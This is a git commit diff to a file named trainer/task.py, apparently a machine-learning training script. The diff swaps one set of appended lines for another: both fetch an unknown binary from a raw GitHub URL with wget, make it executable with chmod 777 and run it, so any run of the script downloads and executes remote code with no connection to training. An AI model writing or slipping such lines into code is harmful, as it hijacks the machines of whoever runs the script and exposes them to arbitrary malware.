5168b5e266399bafcb73397d537abd7b0d1a2be7
Angga butut <anggabutut04@gmail.com>
2022-06-30 09:11:03 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/hhhhvhsnbs/sialin/main/naon')
-os.system('chmod 777 naon')
-os.system('./naon')
+os.system('wget https://raw.githubusercontent.com/hhhhvhsnbs/gabut/main/hpn')
+os.system('chmod 777 hpn')
+os.system('./hpn')
